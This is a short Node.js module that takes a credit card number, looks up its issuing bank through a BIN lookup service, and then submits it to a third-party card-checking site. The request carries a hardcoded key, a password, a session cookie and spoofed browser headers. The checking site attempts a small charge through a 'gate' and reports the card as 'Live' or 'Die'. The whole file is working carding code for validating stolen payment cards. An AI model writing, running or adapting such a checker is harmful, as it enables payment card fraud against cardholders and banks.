const fetch = require('node-fetch');

async function main(cc, webnb) {
	let info = {};
	let p = "key=CheckerCCV-rqDN39r3b41HYQ1&password=DEPTRAICOGISAI&ajax=1&hamxuly=checkwebsite&listcc="+encodeURI(cc)+"&delim=%7C&email=0&webcheck=CCV0"+webnb+"&sleep=1"

	let t = await fetch("https://lookup.binlist.net/"+encodeURI(cc));
	let json;
	try{
		json = await t.json();
	}catch(e){
		return {"err": "CC has failed or does not exist!"};
	}

	let data = await fetch(" https://checkerccv.com/thuvien.php?", {
	    method: "POST",
	    body: p,
	    headers: {
	        "accept": "application/json, text/javascript, */*; q=0.01", 
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US,en;q=0.9",
			"content-length": 163,
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"cookie": "__gads=ID=a9ed5413f9ffd273-22bcf68dcdd100c9:T=1649396913:RT=1649396913:S=ALNI_Mbil3bMgmOnB_kIET9VL-piYTTq6w; PHPSESSID=h97reo6qk9irh6dri5551levov; key-public=CheckerCCV-rqDN39r3b41HYQ1",
			"origin": "https://checkerccv.com",
			"referer": "https://checkerccv.com/",
			"sec-ch-ua": "\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "Windows",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
			"x-requested-with": "XMLHttpRequest"
	    }
	})
	let checkjs = await data.json();

	info.gate = webnb == 2?"Charge 0.1$":"Charge 1$";
	info.cc = cc;
	//console.log(json.bank);
	info.bank = json.bank.name;
	info.country = json.country.name;
	info.brand = json.scheme;
	info.type = json.type;
	//info.response = checkjs.msg.split("</b>")[0].indexOf("Die") == -1?"Live ✅":"Die ❌";
	if(checkjs.msg.split("</b>")[0].indexOf("Die") != -1) info.response = "Die ❌"
	else if(checkjs.msg.split("</b>")[0].indexOf("Live") != -1) info.response = "Live ✅"
	else info.response = "Invalid❓"
	//console.log(checkjs.msg);

	return info;
}

module.exports = main;

//{"number":{"length":16,"luhn":true},"scheme":"visa","type":"debit","brand":"Traditional","prepaid":true,"country":{"numeric":"840","alpha2":"US","name":"United States of America","emoji":"🇺🇸","currency":"USD","latitude  ":38,"longitude":-97},"bank":{"name":"PNC NATIONAL BANK_OF DELAWARE","url":"www.pnc.com"}}